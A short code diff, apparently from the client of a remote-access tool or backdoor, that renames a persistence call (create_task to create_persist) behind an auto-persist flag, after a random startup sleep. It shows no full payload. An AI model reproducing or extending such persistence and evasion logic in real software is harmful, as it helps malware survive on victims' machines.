@@ -18,7 +18,7 @@ sleep(randint(16, wait_time))
 AUTO_PERSIST = auto_persist
 
 if AUTO_PERSIST:
-    shell.Shell(None, None, None).create_task(None)
+    shell.Shell(None, None, None).create_persist(None)
 
 # executable
 if hasattr(sys, 'frozen'):
